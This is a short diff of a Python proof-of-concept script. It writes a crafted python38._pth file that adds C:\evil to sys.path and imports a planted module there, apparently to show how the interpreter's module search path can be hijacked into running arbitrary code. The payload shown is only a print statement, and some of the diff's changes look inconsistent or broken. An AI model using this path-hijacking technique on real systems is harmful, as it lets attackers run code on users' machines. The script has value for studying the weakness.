@@ -1,12 +1,13 @@
 # Import the os module
 import os
+import sys
 
 # Define a malicious python38._pth file
 # This file has a crafted sys.path value
 # This value will point to an arbitrary location
 # The location contains a malicious code file
 pth_file = "python38._pth"
-pth_content = "import site\nsys.path.append('C:\\\\evil')"
+pth_content = "import site\nsys.path.append('C:\\\\evil')\nimport evil"
 
 # Write the malicious python38._pth file to the current directory
 with open(pth_file, "w") as f:
@@ -27,4 +28,6 @@ with open("C:\\evil\\" + code_file, "w") as f:
 # This will trigger the vulnerability in Python
 # The interpreter will load the malicious code file from the arbitrary location
 # The print statement will be executed
-os.system("python")
+#os.system("python")
+sys.path.append(".")
+import python38
